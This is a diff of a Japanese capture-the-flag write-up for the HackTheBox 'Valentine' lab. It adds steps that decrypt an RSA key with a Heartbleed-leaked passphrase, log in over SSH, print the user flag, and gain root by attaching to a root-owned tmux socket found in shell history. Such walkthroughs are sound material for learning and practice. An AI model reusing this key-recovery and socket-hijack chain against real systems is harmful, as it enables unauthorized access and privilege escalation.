@@ -32,6 +32,7 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
 ```
 
+
 ## STEP 2
 443番にアクセス  
 80番にアクセスしても、おなじページであった
@@ -179,9 +180,36 @@ WARNING: server 10.129.232.136 returned more data than it should - server is vul
 └─$ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
 heartbleedbelievethehype
 ```
+ビンゴ！秘密鍵のパスフレーズ解除できた
+```SH
+└─$ openssl rsa -in id_rsa.txt -out id_rsa
+Enter pass phrase for id_rsa.txt:
+writing RSA key
+```
+ということでsshログイン成功！ユーザフラグゲット
+```sh
+└─$ ssh -i id_rsa hype@10.129.232.136                                                                                            
+sign_and_send_pubkey: no mutual signature supported
+hype@10.129.232.136's password: 
+
+└─$ ssh -i id_rsa -o 'PubkeyAcceptedKeyTypes +ssh-rsa' hype@10.129.232.136
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+hype@Valentine:~$ cat user.txt
+80e2cf81e6b65e553c937f2b25a273b8
+```
 
 
-## STEP 3
+## STEP 4
+hacktheboxなんていつもはコマンド履歴なんて消されているのに、今回は残っているね  
+tmuxというターミナルをセッション管理できるツール  
+履歴上では、ソケット「/.devs/dev/sess」が保存されており、権限はroot所有になっている  
+ためしにソケットを開いてみると
 ```sh
 hype@Valentine:~$ history
     1  exit
@@ -198,4 +226,8 @@ hype@Valentine:~$ history
    12  tmux -S /.devs/dev_sess 
    13  exit
 
+hype@Valentine:~$ ls -l /.devs/dev_sess 
+srw-rw---- 1 root hype 0 Aug 12 04:41 /.devs/dev_sess
 ```
+ルートのセッションを開けた！ルートフラグゲット！  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Valentine_03.png">  
